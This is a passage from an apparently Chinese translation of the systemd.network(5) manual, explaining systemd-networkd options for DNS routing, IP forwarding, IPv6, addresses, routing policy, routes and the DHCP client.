会读取此选项的值。 “搜索域”对应于 <a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html">resolv.conf(5)</a> 中的 <code>domain</code> 与 <code>search</code> 项。 在传统的 glibc API 中 无法找到与此处描述的域名路由逻辑对应的功能。</p><h6 id="DNSDefaultRoute"><a href="#DNSDefaultRoute" class="headerlink" title="DNSDefaultRoute"></a>DNSDefaultRoute</h6><p>接受一个布尔值。设为 yes 表示为此连接配置的 DNS 服务器， 将被用于解析不匹配任何其他连接 <code>Domains=</code> 设置的域名。 设为 no 表示为此连接配置的 DNS 服务器，仅用于解析匹配此链接上至少一个 <code>Domains=</code> 的域名(也就是完全不用于解析上述域名)。 若未设置此选项，则默认使用自动模式： 如果此连接没有配置任何”路由域”，那么，为此连接配置的 DNS 服务器， 将用于解析不匹配任何其他连接 <code>Domains=</code> 的域名。</p><h6 id="NTP"><a href="#NTP" class="headerlink" title="NTP"></a>NTP</h6><p>一个时间服务器(NTP)地址。可以多次使用此选项以指定多个对时服务器。 <a href="http://www.jinbuguo.com/systemd/systemd-timesyncd.service.html#">systemd-timesyncd.service(8)</a> 会读取此选项的值。</p><h6 id="IPForward"><a href="#IPForward" class="headerlink" title="IPForward"></a>IPForward</h6><p>控制IP转发功能 (将一个网口进入的IP包根据路由表转发到另一个网口)： 默认值 “<code>no</code>“ 表示关闭转发功能； “<code>yes</code>“ 表示开启转发功能； “<code>ipv4</code>“ 表示仅开启IPv4转发； “<code>ipv6</code>“ 表示仅开启IPv6转发； 此选项实际上是设置了 <code>net.ipv4.ip_forward</code>, <code>net.ipv6.conf.all.forwarding</code> 两个 sysctl 项的值(详见 <a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">ip-sysctl.txt</a> 文档)。默认值为 “<code>no</code>“</p><p>注意：只有默认值 “<code>no</code>“ 是局部设置，其他三个值都是全局设置。 具体的含义是指： 即使只有一个网络接口开启了IP转发功能(“<code>yes</code>“ 或 “<code>ipv4</code>“ 或 “<code>ipv6</code>“)，也表示在全局开启IP转发功能， 而且即便随后再明确的将此选项设为 “<code>no</code>“ 也无济于事，IP转发功能依然会在全局范围内保持开启。 换句话说，IP转发功能一旦开启便是全局开启，并且不允许随后再关闭，即使针对单个网络接口关闭也不行。</p><p>如果只想在两个特定的网络接口之间进行转发，请勿使用此选项， 而是应该使用防火墙规则(iptables)。</p><h6 id="IPMasquerade"><a href="#IPMasquerade" class="headerlink" title="IPMasquerade"></a>IPMasquerade</h6><p>若设为 “<code>yes</code>“ 则开启IP地址伪装功能。 它与SNAT(源地址转换技术)的不同之处在于能够自动获取连接的当前ip地址来做转换。 若设为 “<code>yes</code>“ 则隐含了 <code>IPForward=ipv4</code> 设置。 默认值是 “<code>no</code>“</p><h6 id="IPv6PrivacyExtensions"><a href="#IPv6PrivacyExtensions" class="headerlink" title="IPv6PrivacyExtensions"></a>IPv6PrivacyExtensions</h6><p>配置IPv6 无状态临时地址(<a href="https://tools.ietf.org/html/rfc4941">RFC 4941</a>) 与IPv6隐私扩展。 若设为 “<code>yes</code>“ 则表示开启IPv6隐私扩展并使用临时的私有地址取代公共地址。 若设为 “<code>prefer-public</code>“ 则表示开启IPv6隐私扩展(若失败则关闭IPv6隐私扩展)， 但使用公共地址。 若设为 “<code>kernel</code>“ 则表示不改变内核的现有设置。 默认值 “<code>no</code>“ 表示彻底关闭。</p><h6 id="IPv6AcceptRA"><a href="#IPv6AcceptRA" class="headerlink" title="IPv6AcceptRA"></a>IPv6AcceptRA</h6><p>接受一个布尔值。表示是否在此连接上接收IPv6路由通告消息(Router Advertisement)(IPv6的邻居发现协议的一部分)。 设为 yes 表示接收，设为 no 表示不接收(与本地转发的状态无关)。若未设置此选项，则使用内核的默认值： 当本地转发功能被禁用时，此选项的值为”yes”(接收路由通告)；当本地转发功能被开启时，此选项的值为”no”(不接收路由通告)。 如果此选项的值为”yes”(接收路由通告)，那么 DHCPv6 客户端将在两种情况下被启动： (1)传递了相关标志(flag)；(2)在此连接上未发现路由器。</p><p>若想进一步详细配置 IPv6 RA 支持，可以参见下面的 “<code>[IPv6AcceptRA]</code>“ 小节。</p><p>参见内核的 <a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">ip-sysctl.txt</a> 文档， 并阅读对 “<code>accept_ra</code>“ 属性的解释，不过要注意的是将此选项设为 <code>1</code> 相当于 将 “<code>accept_ra</code>“ 设为 <code>2</code> 。</p><h6 id="IPv6DuplicateAddressDetection"><a href="#IPv6DuplicateAddressDetection" class="headerlink" title="IPv6DuplicateAddressDetection"></a>IPv6DuplicateAddressDetection</h6><p>设置要发送的 IPv6 DAD(Duplicate Address Detection) 提示数量。 若未设置此选项，则使用内核的默认值。</p><h6 id="IPv6HopLimit"><a href="#IPv6HopLimit" class="headerlink" title="IPv6HopLimit"></a>IPv6HopLimit</h6><p>设置 IPv6 的”Hop Limit”(类似于 IPv4 TTL)值。 每经过一个路由器，该值都会减一， 当减到零时，此包将被丢弃。 若未设置此选项，则使用内核的默认值。</p><h6 id="IPv4ProxyARP"><a href="#IPv4ProxyARP" class="headerlink" title="IPv4ProxyARP"></a>IPv4ProxyARP</h6><p>接受一个布尔值， 表示是否为 IPv4 开启”代理ARP”(<a href="https://tools.ietf.org/html/rfc1027">RFC1027</a>)支持。 “代理ARP”就是通过一个主机(通常是路由器)来作为指定的设备对其他设备的ARP请求作出应答。 一般用于没有配置默认网关和路由策略的网络中。 若未设置此选项，则使用内核的默认值。</p><h6 id="IPv6ProxyNDP"><a href="#IPv6ProxyNDP" class="headerlink" title="IPv6ProxyNDP"></a>IPv6ProxyNDP</h6><p>接受一个布尔值，表示是否支持代理邻居发现协议(Proxy Neighbor Discovery Protocol)。 如果相互通信的两个端点并不直接相连，但是互相又都期望彼此位于同一个直接相连物理连接上时， 可以使用代理邻居发现协议(Proxy Neighbor Discovery Protocol)， 将双方的IPv6地址都映射到”NDP代理”的MAC地址，让”NDP代理”转发两个端点之间的流量， 从而使相互通信的双方看起来就像是在同一个物理连接上直接通信一样。 与 IPv4 的 proxy ARP 技术不同之处在于 IPv6 的NDP代理不是全局开启的， 它仅为”IPv6 neighbor proxy table”中的地址发送邻居宣告消息。 可以使用 <strong>ip -6 neighbour show proxy</strong> 命令显示”IPv6 neighbor proxy table”。 systemd-networkd 将会根据此选项的开关，来控制该接口的 proxy_ndp 开关。 若未设置此选项，则使用内核的默认值。</p><h6 id="IPv6ProxyNDPAddress"><a href="#IPv6ProxyNDPAddress" class="headerlink" title="IPv6ProxyNDPAddress"></a>IPv6ProxyNDPAddress</h6><p>用于代理邻居宣告(Neighbor Advertisement)消息的 IPv6 地址(NDP代理)。 可以多次使用此选项以设置多个代理。对于每个已配置的接口， systemd-networkd 将会把此处设置的代理添加到内核的 IPv6 neighbor proxy table 中。 虽然设置此选项相当于隐含的设置了 <code>IPv6ProxyNDP=yes</code> ， 但是如果明确的设置了 <code>IPv6ProxyNDP=no</code> ，那么此选项将被忽略。若未设置此选项，则使用内核的默认值。</p><h6 id="IPv6PrefixDelegation"><a href="#IPv6PrefixDelegation" class="headerlink" title="IPv6PrefixDelegation"></a>IPv6PrefixDelegation</h6><p>是否允许在此连接上发送IPv6路由通告消息(Router Advertisement)(IPv6的邻居发现协议的一部分)。 设为 “<code>static</code>“ 表示按照 “<code>[IPv6PrefixDelegation]</code>“ 与任意 “<code>[IPv6Prefix]</code>“ 小节中的定义分配前缀。 设为 “<code>dhcpv6</code>“ 表示使用为另一个连接配置的 DHCPv6 客户端以及在 “<code>[IPv6PrefixDelegation]</code>“ 小节中配置的任意值请求前缀，同时忽略所以静态前缀配置小节。 设为 “<code>yes</code>“ 表示既使用静态配置也使用 DHCPv6 。 设为 “<code>no</code>“ 表示完全关闭 IPv6 前缀委派(Prefix Delegation)。 默认值为 “<code>no</code>“ 。详见 “<code>[IPv6PrefixDelegation]</code>“ 与 “<code>[IPv6Prefix]</code>“ 小节以了解更多配置选项。</p><h6 id="IPv6MTUBytes"><a href="#IPv6MTUBytes" class="headerlink" title="IPv6MTUBytes"></a>IPv6MTUBytes</h6><p>设置 IPv6 最大传输单元(MTU)。 必须设为一个大于等于 1280 字节的整数值。若未设置此选项，则使用内核的默认值。</p><h6 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h6><p>将该连接添加到指定名称的Bridge(网桥)中。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。</p><h6 id="Bond"><a href="#Bond" class="headerlink" title="Bond"></a>Bond</h6><p>将该连接添加到指定名称的Bond(多网卡绑定)中。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。</p><h6 id="VRF"><a href="#VRF" class="headerlink" title="VRF"></a>VRF</h6><p>将该连接添加到指定名称的VRF(VPN路由与转发表)中。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。</p><h6 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h6><p>要在此连接上创建的VLAN(虚拟局域网)名称。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。 可以多次使用此选项。</p><h6 id="IPVLAN"><a href="#IPVLAN" class="headerlink" title="IPVLAN"></a>IPVLAN</h6><p>要在该连接上创建的 IPVLAN 的名称。详见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。 可以多次使用此选项。</p><h6 id="MACVLAN"><a href="#MACVLAN" class="headerlink" title="MACVLAN"></a>MACVLAN</h6><p>要在此连接上创建的MACVLAN(基于MAC地址划分的虚拟局域网)名称。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。 可以多次使用此选项。</p><h6 id="VXLAN"><a href="#VXLAN" class="headerlink" title="VXLAN"></a>VXLAN</h6><p>要在此连接上创建的VXLAN(虚拟可扩展局域网)名称。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。 可以多次使用此选项。</p><h6 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h6><p>要在此连接上创建的Tunnel(隧道)名称。参见 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 手册。 可以多次使用此选项。</p><h6 id="ActiveSlave"><a href="#ActiveSlave" class="headerlink" title="ActiveSlave"></a>ActiveSlave</h6><p>接受一个布尔值，设为 yes 表示该设备是等待激活的 slave 设备(必须处于 up 状态)。 此选项仅适用于 “<code>active-backup</code>“, “<code>balance-alb</code>“, “<code>balance-tlb</code>“ 模式。默认值为 no 。 此选项在效果上相当于设置 bond 模块的 active_slave 属性。</p><h6 id="PrimarySlave"><a href="#PrimarySlave" class="headerlink" title="PrimarySlave"></a>PrimarySlave</h6><p>接受一个布尔值，设为 yes 表示该设备是首选的 slave 设备， 也就是一旦该设备可用，就立即将其激活， 并且仅在该设备确实已经掉线的情况下才会使用其他 slave 设备。 在希望尽可能优先使用某个 slave 的场合(比如某个 slave 的带宽更高)， 可以使用此选项。 此选项仅适用于 “<code>active-backup</code>“, “<code>balance-alb</code>“, “<code>balance-tlb</code>“ 模式。默认值为 no 。此选项在效果上相当于设置 bond 模块的 primary 属性。</p><h6 id="ConfigureWithoutCarrier"><a href="#ConfigureWithoutCarrier" class="headerlink" title="ConfigureWithoutCarrier"></a>ConfigureWithoutCarrier</h6><p>接受一个布尔值，设为 yes 表示即使没有实际的载体，也允许 networkd 配置该连接。 默认值为 no 。</p><h5 id="4-Address"><a href="#4-Address" class="headerlink" title="4.Address"></a>4.Address</h5><p>可以使用多个 “<code>[Address]</code>“ 小节来配置多个IP地址。 可在 “<code>[Address]</code>“ 小节中使用的选项如下：</p><h6 id="Address-1"><a href="#Address-1" class="headerlink" title="Address"></a>Address</h6><p>含义与 “<code>[Network]</code>“ 小节中同名选项相同。 这是一个必须设置的选项。</p><h6 id="Peer"><a href="#Peer" class="headerlink" title="Peer"></a>Peer</h6><p>一个用于点对点网络中的IP地址， 格式与 “<code>Address</code>“ 相同。</p><h6 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h6><p>一个 符合 <a href="http://man7.org/linux/man-pages/man3/inet_pton.3.html">inet_pton(3)</a> 格式的广播地址，仅用于IPv4连接。 若未设置，则自动从 “<code>Address</code>“ 中提取。</p><h6 id="Label"><a href="#Label" class="headerlink" title="Label"></a>Label</h6><p>一个地址标签</p><h6 id="PreferredLifetime"><a href="#PreferredLifetime" class="headerlink" title="PreferredLifetime"></a>PreferredLifetime</h6><p>设置IP地址的默认有效期。 默认值 “<code>forever</code>“&#x2F;“<code>infinity</code>“ 表示”永不过期”，也就是本小节所设置的IP地址永远有效。 设为 “<code>0</code>“ 表示本小节所设置的IP地址”立即过期”， 除非被明确要求，否则不会被使用。 这种IP地址仅用于 某些需要明确使用该地址的特殊应用程序。</p><h6 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h6><p>IP地址的作用域。可设为 0～255 之间的整数或特殊值 “<code>global</code>“(可用于任何地方), “<code>link</code>“(仅用于局域网), “<code>host</code>“(仅限于主机内通信) 之一。 默认值是 “<code>global</code>“ 。</p><h6 id="HomeAddress"><a href="#HomeAddress" class="headerlink" title="HomeAddress"></a>HomeAddress</h6><p>接受一个布尔值。设为 yes 表示将该地址视为 <a href="https://tools.ietf.org/html/rfc6275">RFC 6275</a> 中定义的”home address”。 仅适用于 IPv6 。默认值是 no</p><h6 id="DuplicateAddressDetection"><a href="#DuplicateAddressDetection" class="headerlink" title="DuplicateAddressDetection"></a>DuplicateAddressDetection</h6><p>接受一个布尔值。设为 yes 表示在添加该地址时执行 <a href="https://tools.ietf.org/html/rfc4862">RFC 4862</a> 中描述的重复地址检测动作。 仅适用于 IPv6 。默认值是 no</p><h6 id="ManageTemporaryAddress"><a href="#ManageTemporaryAddress" class="headerlink" title="ManageTemporaryAddress"></a>ManageTemporaryAddress</h6><p>接受一个布尔值。设为 yes 表示内核将按照 <a href="https://tools.ietf.org/html/rfc3041">RFC 3041</a> 隐私扩展规范，管理根据 <code>Address=</code> 的值作为模版而创建的临时地址。 要想让此设置有效，必须使用 sysctl 将 use_tempaddr 属性设为大于零的值。 给定地址的前缀长度必须是 64 。 开启此选项之后，就像激活了无状态自动配置一样，将允许在手动配置的网络上使用隐私扩展。 仅适用于 IPv6 。默认值是 no</p><h6 id="PrefixRoute"><a href="#PrefixRoute" class="headerlink" title="PrefixRoute"></a>PrefixRoute</h6><p>接受一个布尔值。 当添加或修改一个 IPv6 地址时，用户空间程序需要一个禁止添加前缀路由的指示。 这与例如 IFA_F_MANAGERTEMPADDR 等标记一起使用时相关，此时用户空间程序会创建根据 autoconf 生成的地址， 但是取决于不同的环节，有可能不应该为此前缀添加路由。默认值是 no</p><h6 id="AutoJoin"><a href="#AutoJoin" class="headerlink" title="AutoJoin"></a>AutoJoin</h6><p>接受一个布尔值。因为交换机不会复制不为多播地址报告IGMP的端口上的多播包， 所以如果有一个能够感知IGMP的以太网交换机， 那么将无法通过 <strong>ip maddr</strong> 命令在以太网层次上加入到多播组中去。 通过 <strong>ip link add vxlan</strong> 命令创建的 vxlan 设备或者通过 systemd-networkd 创建的 vxlan 虚拟网络设备， 都开启了必要的选项以允许它们加入到多播组中去。 通过使用 “<code>autojoin</code>“ 选项扩展 <strong>ip maddr</strong> 命令， 可以让 openvswitch (OVS) vxlan 获得类似的功能， 同时仍然保留其他需要接受多播流量的隧道机制。 默认值是 “<code>no</code>“</p><h5 id="5-Neighbor"><a href="#5-Neighbor" class="headerlink" title="5.Neighbor"></a>5.Neighbor</h5><p>“<code>[Neighbor]</code>“ 小节 用于在邻居表(IPv6)或ARP表(IPv4)中， 为给定的MAC地址添加一个永久静态项。 可以使用多个 “<code>[Neighbor]</code>“ 小节来配置多个静态邻居。 可以在 “<code>[Neighbor]</code>“ 小节中使用的选项如下：</p><h6 id="Address-2"><a href="#Address-2" class="headerlink" title="Address"></a>Address</h6><p>邻居的IP地址</p><h6 id="MACAddress-2"><a href="#MACAddress-2" class="headerlink" title="MACAddress"></a>MACAddress</h6><p>邻居的MAC地址</p><h5 id="6-IPv6AddressLabel"><a href="#6-IPv6AddressLabel" class="headerlink" title="6.IPv6AddressLabel"></a>6.IPv6AddressLabel</h5><p>IPv6地址标签用于地址选择(参见 <a href="https://tools.ietf.org/html/rfc3484">RFC 3484</a>)。 内核仅存储标签自身，而标签的优先级则由用户空间程序管理。 可以使用多个 “<code>[IPv6AddressLabel]</code>“ 小节来配置多个IPv6地址标签。 可在 “<code>[IPv6AddressLabel]</code>“ 小节中使用的选项如下：</p><h6 id="Label-1"><a href="#Label-1" class="headerlink" title="Label"></a>Label</h6><p>用于前缀(一个无符号整数)的标签，必须设为 0 到 4294967294 之间的一个整数。 0xffffffff 是预留值，禁止使用。这是一个必须设置的选项。</p><h6 id="Prefix"><a href="#Prefix" class="headerlink" title="Prefix"></a>Prefix</h6><p>IPv6前缀是指一个带有前缀长度的地址(以 “<code>/</code>“ 字符分隔)。 这是一个必须设置的选项。</p><h5 id="7-RoutingPolicyRule"><a href="#7-RoutingPolicyRule" class="headerlink" title="7.RoutingPolicyRule"></a>7.RoutingPolicyRule</h5><p>可以使用多个 “<code>[RoutingPolicyRule]</code>“ 小节来配置多个路由策略。 可在 “<code>[RoutingPolicyRule]</code>“ 小节中使用的选项如下：</p><h6 id="TypeOfService"><a href="#TypeOfService" class="headerlink" title="TypeOfService"></a>TypeOfService</h6><p>指定要匹配的服务类型。可设为一个 0～255 之间的整数。</p><h6 id="From"><a href="#From" class="headerlink" title="From"></a>From</h6><p>指定要匹配的源地址前缀。可以加上”&#x2F;前缀长度”后缀。</p><h6 id="To"><a href="#To" class="headerlink" title="To"></a>To</h6><p>指定要匹配的目的地址前缀。可以加上”&#x2F;前缀长度”后缀。</p><h6 id="FirewallMark"><a href="#FirewallMark" class="headerlink" title="FirewallMark"></a>FirewallMark</h6><p>指定要匹配的 iptables 防火墙标签值(一个介于 1～4294967295 之间的整数)</p><h6 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h6><p>指定在规则选择器匹配成功时， 要查找的路由表ID(一个介于 1～4294967295 之间的整数)。</p><h6 id="Priority"><a href="#Priority" class="headerlink" title="Priority"></a>Priority</h6><p>指定该规则的优先级，必须设为一个无符号整数。 数值越小优先级越高，也就是多条规则按照各自优先级数值从小到大的顺序处理。</p><h6 id="IncomingInterface"><a href="#IncomingInterface" class="headerlink" title="IncomingInterface"></a>IncomingInterface</h6><p>指定要匹配的流入设备。如果设为回环接口，那么表示该规则仅匹配本机产生的数据包。</p><h6 id="OutgoingInterface"><a href="#OutgoingInterface" class="headerlink" title="OutgoingInterface"></a>OutgoingInterface</h6><p>指定要匹配的流出设备。流出接口仅用于源自绑定到某个设备的本地套接字的数据包。</p><h6 id="SourcePort"><a href="#SourcePort" class="headerlink" title="SourcePort"></a>SourcePort</h6><p>指定要在转发信息库(FIB)规则中匹配的源IP端口或源IP端口范围。 可以通过”低端口-高端口”格式(使用连字符)来指定端口范围。默认未设置。</p><h6 id="DestinationPort"><a href="#DestinationPort" class="headerlink" title="DestinationPort"></a>DestinationPort</h6><p>指定要在转发信息库(FIB)规则中匹配的目标IP端口或目标IP端口范围。 可以通过”低端口-高端口”格式(使用连字符)来指定端口范围。默认未设置。</p><h6 id="IPProtocol"><a href="#IPProtocol" class="headerlink" title="IPProtocol"></a>IPProtocol</h6><p>指定要在转发信息库(FIB)规则中匹配的IP协议。可设为例如 “<code>tcp</code>“, “<code>udp</code>“, “<code>sctp</code>“ 这样的协议名称，或者例如 “<code>6</code>“(“<code>tcp</code>“), “<code>17</code>“(“<code>udp</code>“) 这样的协议号。 默认未设置。</p><h6 id="InvertRule"><a href="#InvertRule" class="headerlink" title="InvertRule"></a>InvertRule</h6><p>一个布尔值。表示是否反转规则。默认为 no 。</p><h5 id="8-Route"><a href="#8-Route" class="headerlink" title="8.Route"></a>8.Route</h5><p>可以使用多个 “<code>[Route]</code>“ 小节来配置多个路由。 可在 “<code>[Route]</code>“ 小节中使用的选项如下：</p><h6 id="Gateway-1"><a href="#Gateway-1" class="headerlink" title="Gateway"></a>Gateway</h6><p>含义与 “<code>[Network]</code>“ 中的同名选项相同。</p><h6 id="GatewayOnlink"><a href="#GatewayOnlink" class="headerlink" title="GatewayOnlink"></a>GatewayOnlink</h6><p>接受一个布尔值。默认值为 “<code>no</code>“ 。 设为 yes 表示要求内核不必检查本小节设置的网关是否直接可达， 也就是内核不必检查本小节所设置的网关是否确实连接到了本地网络上。 这样，在向内核的路由表插入路由记录时，可以阻止内核抱怨”路由不可达”的错误。</p><h6 id="Destination"><a href="#Destination" class="headerlink" title="Destination"></a>Destination</h6><p>该路由的目的地址前缀，可以带有”&#x2F;前缀长度”后缀， 如果省略了此后缀， 则视为一个全长度的主机路由。</p><h6 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h6><p>该路由的源地址前缀，可以带有”&#x2F;前缀长度”后缀， 如果省略了此后缀， 则视为一个全长度的主机路由。</p><h6 id="Metric"><a href="#Metric" class="headerlink" title="Metric"></a>Metric</h6><p>该路由的跃点数(一个正整数)</p><h6 id="IPv6Preference"><a href="#IPv6Preference" class="headerlink" title="IPv6Preference"></a>IPv6Preference</h6><p>为路由发现消息(Router Discovery messages)设置路由优先级(参见 <a href="https://tools.ietf.org/html/rfc4191">RFC4191</a>)。 可设为如下值： “<code>low</code>“ 表示最低优先级、 “<code>medium</code>“ 表示默认优先级、 “<code>high</code>“ 表示最高优先级。</p><h6 id="Scope-1"><a href="#Scope-1" class="headerlink" title="Scope"></a>Scope</h6><p>该路由的适用范围： “<code>global</code>“, “<code>link</code>“, “<code>host</code>“ 。 默认值为 “<code>global</code>“</p><h6 id="PreferredSource"><a href="#PreferredSource" class="headerlink" title="PreferredSource"></a>PreferredSource</h6><p>该路由的首选源地址， 必须符合 <a href="http://man7.org/linux/man-pages/man3/inet_pton.3.html">inet_pton(3)</a> 格式。</p><h6 id="Table-num"><a href="#Table-num" class="headerlink" title="Table=_num_"></a><code>Table=_</code>num<code>_</code></h6><p>该路由表的标识符(可设为 1~4294967295 之间的整数， 0 表示不设置标识符)。 可以通过 <strong>ip route show table <em><code>num</code></em></strong> 命令查看此路由表的内容。</p><h6 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h6><p>设置路由的协议标识符。可设为 0 到 255 之间的整数，或者特殊值 “<code>kernel</code>“, “<code>boot</code>“, “<code>static</code>“ 之一。默认值为 “<code>static</code>“</p><h6 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h6><p>设置路由的类型。可设为下列值之一： “<code>unicast</code>“ 表示描述前往目的地址的真实路径(单播路由)、 “<code>blackhole</code>“ 表示直接悄无声息的丢弃数据包(黑洞路由)、 “<code>unreachable</code>“ 表示直接丢弃数据包并返回一个”主机不可达”ICMP消息、 “<code>prohibit</code>“ 表示直接丢弃数据包并返回一个”通信被禁止”ICMP消息。 “<code>throw</code>“ 表示在当前路由表中的路由查找将失败，路由选择过程将返回到路由策略数据库(RPDB)。 默认值是 “<code>unicast</code>“ 。</p><h6 id="InitialCongestionWindow"><a href="#InitialCongestionWindow" class="headerlink" title="InitialCongestionWindow"></a>InitialCongestionWindow</h6><p>设置启动TCP连接时使用的初始TCP拥塞窗口大小。在TCP会话启动期间， 当客户端请求资源时，服务器的初始拥塞窗口大小决定了首次数据传输时一次性向客户端发送多少字节的数据。 取值范围是 1 到 4294967295(2^32 - 1) 字节(可以使用以1024为基准的 K, M, G 后缀)。 若未设置此选项，则使用内核的默认值。</p><h6 id="InitialAdvertisedReceiveWindow"><a href="#InitialAdvertisedReceiveWindow" class="headerlink" title="InitialAdvertisedReceiveWindow"></a>InitialAdvertisedReceiveWindow</h6><p>设置TCP初始接收窗口大小，也就是首次传输时可以一次性接受多少字节的数据。 在等待接收端确认和更新窗口之前，发送端每次最多只能发送该这么多数据。 取值范围是 1 到 4294967295(2^32 - 1) 字节(可以使用以1024为基准的 K, M, G 后缀)。 若未设置此选项，则使用内核的默认值。</p><h6 id="QuickAck"><a href="#QuickAck" class="headerlink" title="QuickAck"></a>QuickAck</h6><p>接受一个布尔值。设为 yes 表示为路由启用 TCP “quick ack”模式。若未设置此选项，则使用内核的默认值。</p><h6 id="MTUBytes-1"><a href="#MTUBytes-1" class="headerlink" title="MTUBytes"></a>MTUBytes</h6><p>设置该路由的最大传输单元。 单位是字节(可以使用 以1024为基准的 K, M, G 后缀)。</p><p>注意，如果在此连接上启用了 IPv6 ，那么任何小于 1280 (IPv6 的最小 MTU 值) 的值都会被自动增加到 1280 。</p><h5 id="9-DHCP"><a href="#9-DHCP" class="headerlink" title="9.DHCP"></a>9.DHCP</h5><p>“<code>[DHCP]</code>“ 小节用于配置 DHCPv4&#x2F;DHCP6 客户端。 仅在 [Network] 小节中的 <code>DHCP=</code> 选项已开启的情况下有意义。</p><h6 id="UseDNS"><a href="#UseDNS" class="headerlink" title="UseDNS"></a>UseDNS</h6><p>默认值 yes 表示 从DHCP服务器接收DNS服务器的设置， 同时无视任何本地的静态DNS配置。</p><p>这相当于 <a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html">resolv.conf(5)</a> 中 <code>nameserver</code> 的作用。</p><h6 id="UseNTP"><a href="#UseNTP" class="headerlink" title="UseNTP"></a>UseNTP</h6><p>默认值 yes 表示 从DHCP服务器接收NTP服务器的设置(被 systemd-timesyncd 使用)， 同时无视任何本地的静态NTP配置。</p><h6 id="UseMTU"><a href="#UseMTU" class="headerlink" title="UseMTU"></a>UseMTU</h6><p>若设为 yes 则表示 从DHCP服务器接收MTU(最大传输单元)的设置。 如果已经设置了 <code>MTUBytes=</code> 选项，那么此选项将被忽略。 默认值是 no 。</p><h6 id="Anonymize"><a href="#Anonymize" class="headerlink" title="Anonymize"></a>Anonymize</h6><p>接受一个布尔值。设为 yes 表示按照 <a href="https://tools.ietf.org/html/rfc7844">RFC 7844</a> 规范向 DHCP 服务器发送选项， 也就是不再发送例如主机名之类暴露用户身份的信息，以实现匿名的网络访问。 默认值是 no 。</p><p>此选项应该仅在 <code>MACAddressPolicy=random</code> 的情况下才可以设为 yes 。 参见 <a href="http://www.jinbuguo.com/systemd/systemd.link.html#">systemd.link(5)</a> 手册。</p><p>注意，当此选项被设为 yes 之后， 下列选项将被忽略： <code>SendHostname=</code>, <code>ClientIdentifier=</code>, <code>UseRoutes=</code>, <code>SendHostname=</code>, <code>UseMTU=</code>, <code>VendorClassIdentifier=</code>, &#96;UseTimezone</p><h6 id="SendHostname"><a href="#SendHostname" class="headerlink" title="SendHostname"></a>SendHostname</h6><p>默认值 yes 表示将本机的主机名(hostname)发送给DHCP服务器。 注意，主机名只能由7位ASCII小写字母、数字、连字符(-)组成，并且必须格式化为有效的DNS域名。 否则，即使将此选项设为 yes ， 也不会发送主机名。</p><h6 id="UseHostname"><a href="#UseHostname" class="headerlink" title="UseHostname"></a>UseHostname</h6><p>默认值 yes 表示 将从DHCP服务器接收到的主机名(hostname)设置为系统的临时主机名。</p><h6 id="Hostname"><a href="#Hostname" class="headerlink" title="Hostname"></a>Hostname</h6><p>将此选项的值(而不是真实的主机名)作为主机名发送给 DHCP 服务器。 注意，主机名只能由7位ASCII小写字母、数字、连字符(-)组成， 并且必须格式化为有效的DNS域名。</p><h6 id="UseDomains"><a href="#UseDomains" class="headerlink" title="UseDomains"></a>UseDomains</h6><p>接受一个布尔值或特殊值 “<code>route</code>“ 。 yes 表示将从DHCP服务器接收到的域用于此连接的DNS搜索域。 在效果上与 <code>Domains=</code> 中不带 “<code>~</code>“ 前缀的值类似。 “<code>route</code>“ 表示仅将从DHCP服务器接收到的域用于路由DNS查询(而不用于搜索)， 在效果上与 <code>Domains=</code> 中带有 “<code>~</code>“ 前缀的值类似。 默认值为 no 。</p><p>建议仅在可信任网络环境中才能将此选项设为 yes 。 因为它会影响到所有主机名的解析，特别是单标签主机名(不含”.”的主机名)的解析。 一般来说，仅设置”路由域”而不设置”搜索域”是安全的， 因为这样做不会影响到单标签主机名(不含”.”的主机名)的解析。</p><p>当设为 yes 时，此选项相当于 <a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html">resolv.conf(5)</a> 中 <code>domain</code> 的作用。</p><h6 id="UseRoutes"><a href="#UseRoutes" class="headerlink" title="UseRoutes"></a>UseRoutes</h6><p>默认值 yes 表示从DHCP服务器请求静态路由，并将DHCP服务器返回的结果添加到本机的路由表中， 同时将跃点数设为 1024 ，此外，还会根据路由目的地址以及网关的不同，将 scope 值设为 “global”, “link”, “host” 之一。 如果目的地址就在本机(例如 127.x.x.x 或者本地连接自身的地址)，那么 scope 值将被设为 “host” ， 否则如果网关不存在(也就是直接路由)，那么 scope 值将被设为 “link” 。 对于其他情况， scope 值将被设为默认的 “global” 。</p><h6 id="UseTimezone"><a href="#UseTimezone" class="headerlink" title="UseTimezone"></a>UseTimezone</h6><p>若设为 yes 则表示 将从DHCP服务器接收到的时区用作本机的时区。 默认值是 “<code>no</code>“</p><h6 id="CriticalConnection"><a href="#CriticalConnection" class="headerlink" title="CriticalConnection"></a>CriticalConnection</h6><p>若设为 yes 则表示 即使所获得的IP地址租约已经过期，也不归还，依然继续使用。 这种做法是与DHCP协议相违背的， 但在某些场合却是最佳的选择(例如根文件系统依赖于此连接)。 默认值为 no</p><h6 id="ClientIdentifier"><a href="#ClientIdentifier" class="headerlink" title="ClientIdentifier"></a>ClientIdentifier</h6><p>使用什么样的 DHCPv4 客户端标识符： 